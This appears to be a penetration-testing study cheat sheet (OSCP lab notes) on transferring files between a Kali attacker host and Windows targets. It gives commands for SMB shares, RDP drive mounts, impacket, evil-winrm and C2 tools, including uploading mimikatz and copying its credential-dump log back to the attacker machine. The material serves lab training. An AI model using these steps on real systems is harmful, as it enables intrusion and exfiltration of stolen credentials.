##SMB File Transfer 
kali>impacket-smbserver test . -smb2support  -username ashok -password reddy </br>
WIN>net use m: \\192.168.45.242\home\kali\Desktop\HTB\OSCP\AD\beyond /user:kourosh kourosh </br>
WIN>copy 20240715135750_BloodHound.zip m:\ </br>

 0) SSH

```bash
kali>sudo service ssh start (Transfer file windows to kali)
```

```bash
WIN>scp file kali@192.168.45.208:/home/kali/Desktop/HTB/OSCP(Windows)
```



OSCP Note - https://discord.com/channels/780824470113615893/1148907181480104028
Youtube - https://www.youtube.com/watch?v=kd0sZWI6Blc
1) SMB: 
On Kali:
```bash
impacket-smbserver test . -smb2support  -username ashok -password reddy
```
On Windows:
```powershell
net use m: \\Kali_IP\test /user:ashok reddy
copy mimikatz.log m:\
```
2) RDP mounting shared folder:
- Using xfreerdp:
On Kali:
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200
```
On windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
- Using rdesktop:
On Kali: 
```bash
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```
On Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
3) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
**Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
Uploading mimikatz.exe to the target machine:
```bash
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```bash
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
4) Evil-winrm:
- Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
- Downloading files:
```bash
download mimikatz.log /home/kali/Documents/pen-200
```
5) C2 frameworks:
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

6) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:
File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc
PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

Happy hacking!
